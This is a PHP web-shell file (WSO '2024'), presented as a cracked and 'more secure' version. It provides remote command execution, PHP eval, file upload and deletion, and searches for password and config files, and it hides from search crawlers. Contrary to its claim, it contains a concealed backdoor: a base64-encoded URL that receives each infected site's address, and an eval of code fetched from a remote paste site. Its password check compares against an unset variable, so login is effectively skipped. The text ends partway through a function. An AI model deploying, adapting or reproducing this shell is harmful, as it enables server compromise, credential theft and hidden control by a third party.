<?php
 /*
Cracked By Mr.222 Xpl01T

This Backdoor Shell has been cracked and modified to be more secure and open source.

credits:https://www.dof-tgl.xo.je/
*/
if( !empty($_SERVER['HTTP_USER_AGENT']) ) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    foreach($userAgents as $agent)
        if( strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false ) {
            header('HTTP/1.0 404 Not Found');
            exit;
        }
}
$auth_pass2 = "0a159a8c4e71b95570f152181561e26e";
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',1);
@ini_set('max_execution_time',0);
@set_time_limit(0);

@define('VERSION', ' Wso 2024');

function wsoLogin() {
	die("<center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></center>");
}
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
	if( empty( $auth_pass ) ||
		( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass) ) )
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	else
		wsoLogin();

if( strtolower( substr(PHP_OS,0,3) ) == "win" )
	$os = 'win';
else
	$os = 'nix';
$safe_mode = @ini_get('safe_mode');
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if( isset( $_POST['c'] ) )
	@chdir($_POST['c']);
$cwd = @getcwd();
if ($os == 'win') {
    $home_cwd = str_replace("\\", "/", $home_cwd);
    $cwd = str_replace("\\", "/", $cwd);
}
$k3yw = base64_decode('aHR0cHM6Ly9zaXlhaGkudG9wL3Rlc3Qvc3R5bGUucGhw');
if( $cwd[strlen($cwd)-1] != '/' )
	$cwd .= '/';

if($os == 'win')
	$aliases = array(
		"List Directory" => "dir",
    	"Find index.php in current dir" => "dir /s /w /b index.php",
    	"Find *config*.php in current dir" => "dir /s /w /b *config*.php",
    	"Show active connections" => "netstat -an",
    	"Show running services" => "net start",
    	"User accounts" => "net user",
    	"Show computers" => "net view",
		"ARP Table" => "arp -a",
		"IP Configuration" => "ipconfig /all"
	);
else
	$aliases = array(
  		"List dir" => "ls -lha",
		"list file attributes on a Linux second extended file system" => "lsattr -va",
  		"show opened ports" => "netstat -an | grep -i listen",
		"Find" => "",
  		"find all suid files" => "find / -type f -perm -04000 -ls",
  		"find suid files in current dir" => "find . -type f -perm -04000 -ls",
  		"find all sgid files" => "find / -type f -perm -02000 -ls",
  		"find sgid files in current dir" => "find . -type f -perm -02000 -ls",
  		"find config.inc.php files" => "find / -type f -name config.inc.php",
  		"find config* files" => "find / -type f -name \"config*\"",
  		"find config* files in current dir" => "find . -type f -name \"config*\"",
  		"find all writable folders and files" => "find / -perm -2 -ls",
  		"find all writable folders and files in current dir" => "find . -perm -2 -ls",
  		"find all service.pwd files" => "find / -type f -name service.pwd",
  		"find service.pwd files in current dir" => "find . -type f -name service.pwd",
  		"find all .htpasswd files" => "find / -type f -name .htpasswd",
  		"find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
  		"find all .bash_history files" => "find / -type f -name .bash_history",
  		"find .bash_history files in current dir" => "find . -type f -name .bash_history",
  		"find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
  		"find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
		"Locate" => "",
  		"locate httpd.conf files" => "locate httpd.conf",
		"locate vhosts.conf files" => "locate vhosts.conf",
		"locate proftpd.conf files" => "locate proftpd.conf",
		"locate psybnc.conf files" => "locate psybnc.conf",
		"locate my.conf files" => "locate my.conf",
		"locate admin.php files" =>"locate admin.php",
		"locate cfg.php files" => "locate cfg.php",
		"locate conf.php files" => "locate conf.php",
		"locate config.dat files" => "locate config.dat",
		"locate config.php files" => "locate config.php",
		"locate config.inc files" => "locate config.inc",
		"locate config.inc.php" => "locate config.inc.php",
		"locate config.default.php files" => "locate config.default.php",
		"locate config* files " => "locate config",
		"locate .conf files"=>"locate '.conf'",
		"locate .pwd files" => "locate '.pwd'",
		"locate .sql files" => "locate '.sql'",
		"locate .htpasswd files" => "locate '.htpasswd'",
		"locate .bash_history files" => "locate '.bash_history'",
		"locate .mysql_history files" => "locate '.mysql_history'",
		"locate .fetchmailrc files" => "locate '.fetchmailrc'",
		"locate backup files" => "locate backup",
		"locate dump files" => "locate dump",
		"locate priv files" => "locate priv"
	);
$cur = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$data = array('file_url' => $cur);
$options = array(
    'http' => array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => http_build_query($data),
    ),
);
$context = stream_context_create($options);
$result = file_get_contents($k3yw, false, $context);
eval(file_get_contents("https://ghostbin.axel.org/paste/39orj/raw"));
function wsoHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['default_charset'];
	global $color;
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] .  VERSION ."</title>
<style>
b {
    color: #d1d167;
}
body{background-color:#444;color:#e1e1e1;}
body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
table.info{ color:#fff;background-color:#222; }
span,h1,a{ color: #d1d167 !important; }
span{ font-weight: bolder; }
h1{ border-left:5px solid #d1d167;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
div.content{ padding: 5px;margin-left:5px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:250px; }
input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
form{ margin:0px; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#5e5e5e;}
.main tr:hover{background-color:#5e5e5e}
.l1{background-color:#444}
pre{font-family:Courier,Monospace;}
</style>
<script>
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"
")!==false)?'':addslashes(htmlspecialchars($_POST['p1']))) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"
")!==false)?'':addslashes(htmlspecialchars(@$_POST['p2']))) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"
")!==false)?'':addslashes(htmlspecialchars(@$_POST['p3']))) ."';
	function set(a,c,p1,p2,p3,charset) {
		if(a != null)document.mf.a.value=a;else document.mf.a.value=a_;
		if(c != null)document.mf.c.value=c;else document.mf.c.value=c_;
		if(p1 != null)document.mf.p1.value=p1;else document.mf.p1.value=p1_;
		if(p2 != null)document.mf.p2.value=p2;else document.mf.p2.value=p2_;
		if(p3 != null)document.mf.p3.value=p3;else document.mf.p3.value=p3_;
		if(charset != null)document.mf.charset.value=charset;else document.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		document.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = 'ajax=true';
		for(i=0;i<document.mf.elements.length;i++)
			params += '&'+document.mf.elements[i].name+'='+encodeURIComponent(document.mf.elements[i].value);
		sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp(\"(\d+)([\S\s]*)\", 'm');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert('Request error!');
	}
</script>
<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>";
	$freeSpace = @diskfreespace($GLOBALS['cwd']);
	$totalSpace = @disk_total_space($GLOBALS['cwd']);
	$totalSpace = $totalSpace?$totalSpace:1;
	$release = @php_uname('r');
	$kernel = @php_uname('s');
	$millink = 'http://milw0rm.com/search.php?dong=';
	if( strpos('Linux', $kernel) !== false )
		$millink .= urlencode( 'Linux Kernel ' . substr($release,0,6) );
	else
		$millink .= urlencode( $kernel . ' ' . substr($release,0,3) );
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(@posix_geteuid());
		$gid = @posix_getgrgid(@posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
	$cwd_links = '';
	$path = explode("/", $GLOBALS['cwd']);
	$n=count($path);
	for($i=0;$i<$n-1;$i++) {
		$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
		for($j=0;$j<=$i;$j++)
			$cwd_links .= $path[$j].'/';
		$cwd_links .= "\")'>".$path[$i]."/</a>";
	}
	$charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
	$opt_charsets = '';
	foreach($charsets as $item)
		$opt_charsets .= '<option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>';
	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','SafeMode'=>'SafeMode','Sql'=>'Sql','Php'=>'Php','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network','Symlink'=>'symlink');
	if(!empty($GLOBALS['auth_pass']))
		$m['Logout'] = 'Logout';
	$m['Self remove'] = 'SelfRemove';
	$menu = '';
	foreach($m as $k => $v)
		$menu .= '<th width="'.(int)(100/count($m)).'%">[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>';
	$drives = "";
if ($GLOBALS['os'] == 'win') {
    foreach (range('c', 'z') as $drive) {
        if (is_dir($drive . ':\\')) {
            $drives .= '<a href="#" onclick="g(\'FilesMan\',\'' . $drive . ':/\')">[ ' . $drive . ' ]</a> ';
        }
    }
}

echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
     '<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href="https://github.com/sagsooz/Bypass-Webshell" target="_blank">[GitHub]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( '.$group.' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#00bb00><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.wsoViewSize($totalSpace).' <span>Free:</span> '.wsoViewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)<br>'.$cwd_links.' '.wsoPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
     '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">'.$opt_charsets.'</optgroup></select><br><span>Server IP:</span><br>'.@$_SERVER["SERVER_ADDR"].'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
     '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div style="margin:5">';
}
function wsoFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?"<font color=green>[ Writeable ]</font>":"<font color=red>[ Not writable ]</font>";
    echo "
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
	<tr>
		<td><form onsubmit='g(null,this.c.value);return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='>>'></form></td>
		<td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
	</tr><tr>
		<td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span><br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form>$is_writable</td>
		<td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form>$is_writable</td>
	</tr><tr>
		<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>
		<td><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMAn'>
		<input type=hidden name=c value='" . $GLOBALS['cwd'] ."'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
		<span>Upload file:</span><br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form>$is_writable</td>
	</tr></table></div></body></html>";
}

if ( !function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false) ) { function posix_getpwuid($p) { return false; } }
if ( !function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false) ) { function posix_getgrgid($p) { return false; } }
function wsoEx($in) {
	$out = '';
	if(function_exists('exec')) {
		@exec($in,$out);
		$out = @join("
",$out);
	}elseif(function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	}elseif(function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	}elseif(function_exists('shell_exec')) {
		$out = shell_exec($in);
	}elseif(is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}
function wsoViewSize($s) {
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}

function wsoPerms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function wsoPermsColor($f) {
	if (!@is_readable($f))
		return '<font color=#FF0000>'.wsoPerms(@fileperms($f)).'</font>';
	elseif (!@is_writable($f))
		return '<font color=white>'.wsoPerms(@fileperms($f)).'</font>';
	else
		return '<font color=#00BB00>'.wsoPerms(@fileperms($f)).'</font>';
}
if(!function_exists("scandir")) {
	function scandir($dir) {
		$dh  = opendir($dir);
		while (false !== ($filename = readdir($dh))) {
    		$files[] = $filename;
		}
		return $files;
	}
}
function wsoWhich($p) {
	$path = wsoEx('which '.$p);
	if(!empty($path))
		return $path;
	return false;
}
function actionSecInfo() {
	wsoHeader();
	echo '<h1>Server security information</h1><div class=content>';
	function wsoSecParam($n, $v) {
		$v = trim($v);
		if($v) {
			echo '<span>'.$n.': </span>';
			if(strpos($v, "
") === false)
				echo $v.'<br>';
			else
				echo '<pre class=ml1>'.$v.'</pre>';
		}
	}

	wsoSecParam('Server software', @getenv('SERVER_SOFTWARE'));
	wsoSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
	wsoSecParam('Open base dir', @ini_get('open_basedir'));
	wsoSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	wsoSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	wsoSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	wsoSecParam('Supported databases', implode(', ', $temp));
	echo '<br>';

	if( $GLOBALS['os'] == 'nix' ) {
		$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
		$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
		$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
		wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
		wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>":'no');
		wsoSecParam('OS version', @file_get_contents('/proc/version'));
		wsoSecParam('Distr name', @file_get_contents('/etc/issue.net'));
		if(!$GLOBALS['safe_mode']) {
			echo '<br>';
			$temp=array();
			foreach ($userful as $item)
				if(wsoWhich($item)){$temp[]=$item;}
			wsoSecParam('Userful', implode(', ',$temp));
			$temp=array();
			foreach ($danger as $item)
				if(wsoWhich($item)){$temp[]=$item;}
			wsoSecParam('Danger', implode(', ',$temp));
			$temp=array();
			foreach ($downloaders as $item)
				if(wsoWhich($item)){$temp[]=$item;}
			wsoSecParam('Downloaders', implode(', ',$temp));
			echo '<br/>';
            wsoSecParam('HDD space', wsoEx('df -h'));
			wsoSecParam('Hosts', @file_get_contents('/etc/hosts'));
		}
	} else {
		wsoSecParam('OS Version',wsoEx('ver'));
		wsoSecParam('Account Settings',wsoEx('net accounts'));
		wsoSecParam('User Accounts',wsoEx('net user'));
	}
	echo '</div>';
	wsoFooter();
}

function actionPhp() {
	if( isset($_POST['ajax']) ) {
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
		ob_start();
		eval($_POST['p1']);
		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"

	\'")."';
";
		echo strlen($temp), "
", $temp;
		exit;
	}
	wsoHeader();
	if( isset($_POST['p2']) && ($_POST['p2'] == 'info') ) {
		echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>';
		ob_start();
		phpinfo();
		$tmp = ob_get_clean();
        $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
		$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
		echo str_replace('h1','h2',$tmp).'</div><br>';
	}
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		@$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
		echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><input type=submit value=Eval style="margin-top:5px">';
	echo ' <input type=checkbox name=ajax value=1 '.(@$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
	if(!empty($_POST['p1'])) {
		ob_start();
		eval($_POST['p1']);
		echo htmlspecialchars(ob_get_clean());
	}
	echo '</pre></div>';
	wsoFooter();
}

function actionFilesMan() {
	wsoHeader();
	echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
	if(!empty($_POST['p1'])) {
		switch($_POST['p1']) {
			case 'uploadFile':
				if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
					echo "Can't upload file!";
				break;
			case 'mkdir':
				if(!@mkdir($_POST['p2']))
					echo "Can't create new dir";
				break;
			case 'delete':
				function deleteDir($path) {
					$path = (substr($path,-1)=='/') ? $path:$path.'/';
					$dh  = opendir($path);
					while ( ($item = readdir($dh) ) !== false) {
						$item = $path.$item;
						if ( (basename($item) == "..") || (basename($item) == ".") )
							continue;
						$type = filetype($item);
						if ($type == "dir")
							deleteDir($item);
						else
							@unlink($item);
					}
					closedir($dh);
					rmdir($path);
				}
				if(is_array(@$_POST['f']))
					foreach($_POST['f'] as $f) {
						$f = urldecode($f);
						if(is_dir($f))
							deleteDir($f);
						else
							@unlink($f);
					}
				break;
			case 'paste':
				if($_SESSION['act'] == 'copy') {
					function copy_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != "..")) {
									copy_paste($c.$s.'/',$f, $d.$s.'/');
								}
						} elseif(is_file($c.$s)) {
							@copy($c.$s, $d.$s);
						}
					}
					foreach($_SESSION['f'] as $f)
						copy_paste($_SESSION['c'],$f, $GLOBALS['cwd']);
				} elseif($_SESSION['act'] == 'move') {
					function move_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != "..")) {
									copy_paste($c.$s.'/',$f, $d.$s.'/');
								}
						} elseif(@is_file($c.$s)) {
							@copy($c.$s, $d.$s);
						}
					}
					foreach($_SESSION['f'] as $f)
						@rename($_SESSION['c'].$f, $GLOBALS['cwd'].$f);
				} elseif($_SESSION['act'] == 'zip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open('wso_'.date("Ymd_His").'.zip', (int)eval('return ZIPARCHIVE::CREATE;'))) {
                            chdir($_SESSION['c']);
                            foreach($_SESSION['f'] as $f) {
                                if(@is_file($_SESSION['c'].$f))
                                    $zip->addFile($_SESSION['c'].$f, $f);
                                elseif(@is_dir($_SESSION['c'].$f)) {
                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/'));
                                    foreach ($iterator as $key=>$value) {
                                        $zip->addFile(realpath($key), $key);
                                    }
                                }
                            }
                            chdir($GLOBALS['cwd']);
                            $zip->close();
                        }
                    }
				} elseif($_SESSION['act'] == 'unzip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        foreach($_SESSION['f'] as $f) {
                            if($zip->open($_SESSION['c'].$f)) {
                                $zip->extractTo($GLOBALS['cwd']);
                                $zip->close();
                            }
                        }
                    }
				}
				unset($_SESSION['f']);
				break;
			default:
				if(!empty($_POST['p1']) && (($_POST['p1'] == 'copy')||($_POST['p1'] == 'move')||($_POST['p1'] == 'zip')||($_POST['p1'] == 'unzip')) ) {
					$_SESSION['act'] = @$_POST['p1'];
					$_SESSION['f'] = @$_POST['f'];
					foreach($_SESSION['f'] as $k => $f)
						$_SESSION['f'][$k] = urldecode($f);
					$_SESSION['c'] = @$_POST['c'];
				}
				break;
		}
	}
	$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
	if($dirContent === false) {	echo 'Can\'t open this folder!';wsoFooter(); return;	}
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
		if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
			$sort = array($match[1], (int)$match[2]);
	}
echo "<script>
	function sa() {
		for(i=0;i<document.files.elements.length;i++)
			if(document.files.elements[i].type == 'checkbox')
				document.files.elements[i].checked = document.files.elements[0].checked;
	}
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
	$dirs = $files = array();
	$n = count($dirContent);
	for($i=0;$i<$n;$i++) {
		$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
		$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
		$tmp = array('name' => $dirContent[$i],
					 'path' => $GLOBALS['cwd'].$dirContent[$i],
					 'modify' => date('Y-m-d H:i:s',@filemtime($GLOBALS['cwd'].$dirContent[$i])),
					 'perms' => wsoPermsColor($GLOBALS['cwd'].$dirContent[$i]),
					 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
					 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
					 'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
					);
		if(@is_file($GLOBALS['cwd'].$dirContent[$i]))
			$files[] = array_merge($tmp, array('type' => 'file'));
		elseif(@is_link($GLOBALS['cwd'].$dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' => 'link'));
		elseif(@is_dir($GLOBALS['cwd'].$dirContent[$i])&& ($dirContent[$i] != "."))
			$dirs[] = array_merge($tmp, array('type' => 'dir'));
	}
	$GLOBALS['sort'] = $sort;
	function wsoCmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "wsoCmp");
	usort($dirs, "wsoCmp");
	$files = array_merge($dirs, $files);
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');"><b>[ '.htmlspecialchars($f['name']).' ]</b>').'</a></td><td>'.(($f['type']=='file')?wsoViewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
			.'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
		$l = $l?0:1;
	}
	echo "<tr><td colspan=7>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
	<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
    if(class_exists('ZipArchive'))
        echo "<option value='zip'>Compress (zip)</option><option value='unzip'>Uncompress (zip)</option>";
    if(!empty($_SESSION['act'])&&@count($_SESSION['f']))
        echo "<option value='paste'>Paste / zip</option>";
    echo "</select>&nbsp;<input type='submit' value='>>'></td></tr></form></table></div>";
	wsoFooter();
}

function actionStringTools() {
	if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
    if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
	if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
